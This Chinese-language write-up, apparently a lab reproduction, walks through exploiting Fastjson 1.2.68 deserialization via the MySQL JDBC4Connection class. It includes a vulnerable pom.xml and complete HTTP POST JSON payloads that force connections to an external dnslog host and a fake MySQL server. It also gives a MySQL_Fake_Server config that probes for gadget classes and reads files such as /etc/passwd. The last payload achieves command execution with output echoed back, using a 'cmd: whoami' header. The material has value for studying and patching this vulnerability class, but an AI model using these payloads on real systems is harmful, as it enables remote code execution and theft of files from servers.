# Fastjson JDBC4Connection利用
# 0x01 环境搭建
- mysql jdbc 5.1.30
- fastjson 1.2.68

📒 pom.xml
```xml
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>fastjson-webapp</artifactId>
    <packaging>war</packaging>
    <version>v202208</version>

    <properties>
            <java.version>1.8</java.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>4.0.8.RELEASE</version>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>4.0.8.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.68</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
        <dependency>
            <groupId>commons-beanutils</groupId>
            <artifactId>commons-beanutils</artifactId>
            <version>1.9.2</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.30</version>
        </dependency>
    </dependencies>
</project>
```

# 0x02 利用思路
1. 发现 fastjson
2. 判断出存在 `mysql jdbc` 利用链
3. 通过dns大致判断 `gadget`
4. 存在 `cb190 gadget`
5. 利用工具封装回显的 `payload`
6. 起一个 `mysql fake server`, 发送 `payload`

# 0x03 漏洞复现
## 3.1 fastjson版本判断
```
POST /parseObject HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 36

{
"@type":"java.lang.AutoCloseable"
```

![image](https://user-images.githubusercontent.com/84888757/229470031-f2af15d4-808d-424b-aa6e-55a8cbb50fae.png)

## 3.2 判断出存在mysql jdbc利用 - JDBC4Connection
```
POST /parseObject HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json
Connection: close
Content-Length: 351

{"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"1268.v6840fsg.eyes.sh","portToConnectTo":80,"info":{"user":"root","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}}
```

![image](https://user-images.githubusercontent.com/84888757/229470371-bca2d9a9-4984-42c0-9d38-b1504e8dca1a.png)

dnslog 平台：

<img width="986" alt="image" src="https://user-images.githubusercontent.com/84888757/229470480-ddddd8c9-3016-4062-94be-2a37ce4240c4.png">

## 3.3 通过dns大致判断gadget
1、下载 [fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server/) ，替换 `config.json` 文件如下，用于后续通过 `DNSlog` 探测服务端存在哪些类。

下载 [ysoserial-for-woodpecker.jar](https://github.com/woodpecker-framework/ysoserial-for-woodpecker/releases/tag/0.5.2) 用来辅助检测。

根据 c0ny1 师傅的 [class checklist](https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/#0x06-%E9%85%8D%E5%90%88class-checklist%E9%A3%9F%E7%94%A8) 来判断目标 Gadget 版本范围。

把 `dnslog` 改成自己的，保留 `cc31` 这种前缀方便判断。

![image](https://user-images.githubusercontent.com/84888757/229471259-c6456092-2d49-4ed1-88f3-5154922ecb28.png)


📒 config.json
```json
{
    "config":{
        "ysoserialPath":"ysoserial-for-woodpecker-0.5.2.jar",
        "javaBinPath":"java",
        "fileOutputDir":"./fileOutput/",
        "displayFileContentOnScreen":true,
        "saveToFile":true
    },
    "fileread":{
        "win_ini":"c:\\windows\\win.ini",
        "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
        "win":"c:\\windows\\",
        "linux_passwd":"/etc/passwd",
        "linux_hosts":"/etc/hosts",
        "index_php":"index.php",
        "ssrf":"https://www.baidu.com/",
        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]
    },
    "yso":{
        "CC31":["FindClassByDNS","http://cc31.v6840fsg.eyes.sh|org.apache.commons.collections.list.TreeList"],
        "CC322":["FindClassByDNS","http://cc322.v6840fsg.eyes.sh|org.apache.commons.collections.functors.FunctorUtils$1"],
        "CC4":["FindClassByDNS","http://cc4.v6840fsg.eyes.sh|org.apache.commons.collections4.comparators.TransformingComparator"],
        "CB190":["FindClassByDNS","http://cb190.v6840fsg.eyes.sh|org.apache.commons.beanutils.BeanIntrospector"],
        "CB183":["FindClassByDNS","http://cb183.v6840fsg.eyes.sh|org.apache.commons.collections.Buffer"],
        "C3P0":["FindClassByDNS","http://c3p0.v6840fsg.eyes.sh|com.mchange.v2.c3p0.test.AlwaysFailDataSource"]
    }
}
```

启动 Mysql Fake Server ，探测目标网站存在哪些类。
```bash
python3 server.py
```

通过 `dnslog` 判断类名存不存在，从而判断服务端可利用的 `gadget` 的版本范围，再去进行利用。

可以看到，目前我们初步判断的是服务端存在
- `TreeList` -> `commons-collections 3.1` 
- `BeanIntrospector` -> `commons-beanutils` >= `190`

![image](https://user-images.githubusercontent.com/84888757/229670212-408135bd-e20b-47ca-a46d-36ec3f2eec68.png)

POST 数据包如下：
```
POST /parseObject HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 473

{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"127.0.0.1","portToConnectTo":3307,"info":{"user":"CC31","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"test","url":"jdbc:mysql://127.0.0.1:3307/test?user=CC31&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"}
```

## 3.4 回显RCE
通过前面的 `dnslog` 探测，我们知道目标网站存在 `commons-beanutils` >= `190`

Tomcat 回显类：https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8

<div align=center><img width="840" alt="image" src="https://user-images.githubusercontent.com/84888757/229471133-72d8cd9a-4748-41e6-8f20-10f19b61be1d.png" /></div>


```
POST /parseObject HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
cmd: whoami
Content-Type: application/json
Content-Length: 505

{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"127.0.0.1","portToConnectTo":3307,"info":{"user":"CB190_Tomcat_DFSEcho","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"test","url":"jdbc:mysql://127.0.0.1:3306/test?user=CB190_Tomcat_DFSEcho&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"}
```

<img width="1022" alt="image" src="https://user-images.githubusercontent.com/84888757/229677320-bbe9518e-3a3f-4e97-9590-54278e891d35.png">

![image](https://user-images.githubusercontent.com/84888757/229677335-616a70cb-8a8f-4105-8fa0-4a90df48759e.png)


# 0x04 参考链接
- [SeeyonFastjson利用链 @caozuoking](https://caozuoking.github.io/2021/10/30/SeeyonFastjson%E5%88%A9%E7%94%A8%E9%93%BE/)
- [Fastjson Mysql JDBC 反序列化 @pickmea](https://www.cnblogs.com/pickmea/p/15157189.html)
- [构造java探测class反序列化gadget @c0ny1](https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/#6-2-CommonsCollections4)
